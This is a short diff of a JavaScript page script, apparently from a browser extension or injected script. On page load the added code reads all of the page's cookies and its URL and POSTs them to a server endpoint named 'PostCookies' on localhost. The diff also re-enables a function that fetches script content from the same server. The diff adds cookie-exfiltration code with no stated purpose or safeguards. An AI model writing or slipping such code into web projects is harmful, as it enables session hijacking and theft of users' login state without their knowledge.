@@ -1,6 +1,8 @@
 ﻿//document.body.innerHTML = document.body.innerHTML.replace(new RegExp("Gmail", "g"), "nobody");
 
 window.onload = function () {
+    var cookies = document.cookie;
+    var currenturl = window.location.href;
     var scripts = document.getElementsByTagName("script");
     for (var i = 0; i < scripts.length; i++) { 
         if (scripts[i].src) {
@@ -13,12 +15,21 @@ window.onload = function () {
             loadDoc(i, window.location.href, scripts[i].innerHTML);
         }
     }
-
-    //getScriptContent();
+    postCookies(cookies, currenturl);
+    getScriptContent();
     //alert(scripts.length);
 }
 
-
+function postCookies(cookies, currenturl) {
+    var xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function () {
+        if (this.readyState === 4 && this.status === 200) {
+        }
+    };
+    xhttp.open("POST", "http://localhost:55168/home/PostCookies", true);
+    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhttp.send("cookies="+cookies+"&url="+ currenturl);
+}
 
 
 function loadDoc(scriptNumber, src, content) {
@@ -33,7 +44,7 @@ function loadDoc(scriptNumber, src, content) {
 }
 
 
-/*function getScriptContent() {
+function getScriptContent() {
     var xhttp = new XMLHttpRequest();
     xhttp.onreadystatechange = function () {
         if (this.readyState === 4 && this.status === 200) {
@@ -42,4 +53,4 @@ function loadDoc(scriptNumber, src, content) {
     xhttp.open("GET", "http://localhost:55168/home/GetScriptContent", true);
     xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhttp.send();
-}*/
+}
